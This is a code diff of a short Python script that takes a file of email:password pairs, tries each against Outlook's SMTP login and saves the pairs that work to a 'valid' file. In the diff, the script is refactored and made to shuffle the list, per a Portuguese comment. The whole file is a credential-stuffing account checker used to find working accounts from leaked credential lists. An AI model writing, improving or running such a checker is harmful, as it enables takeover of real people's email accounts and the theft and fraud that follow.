@@ -1,30 +1,32 @@
-import random
-import re
 import smtplib
-from colorama import Fore
+import random
 
-def is_valid_email():
-    lines = open('outlooks.txt').read().splitlines()
-    acc = random.choice(lines)
-
-    email = acc.split(":")[0]
-    password = acc.split(":")[1]
+def is_valid_email(email, password):
     try:
         server = smtplib.SMTP("smtp-mail.outlook.com", 587)
         server.starttls()
         server.login(email, password)
         server.quit()
-        print(f"{email}:{password} | VALID")
-        with open('outlooks.txt') as f:
-            f.write(f"{email}:{password}\n")
+        return True
     except:
-        print(f"{email}:{password} | INVALID")
-        with open("outlooks.txt", "r") as f:
-            lines = f.readlines()
-        with open("outlooks.txt", "w") as f:
-            for line in lines:
-                if line.strip("\n") != acc:
-                    f.write(line)
+        return False
 
-while True:
-    is_valid_email()
+def main():
+    input_file = 'outlooks.txt'
+    output_file = 'valid_outlooks.txt'
+    
+    with open(input_file, 'r') as infile, open(output_file, 'a') as outfile:
+        lines = infile.readlines()
+        random.shuffle(lines)  # Embaralha as linhas para não testar na mesma ordem
+        
+        for line in lines:
+            email, password = line.strip().split(":")
+            
+            if is_valid_email(email, password):
+                print(f"{email}:{password} | VALID")
+                outfile.write(f"{email}:{password}\n")
+            else:
+                print(f"{email}:{password} | INVALID")
+
+if __name__ == "__main__":
+    main()
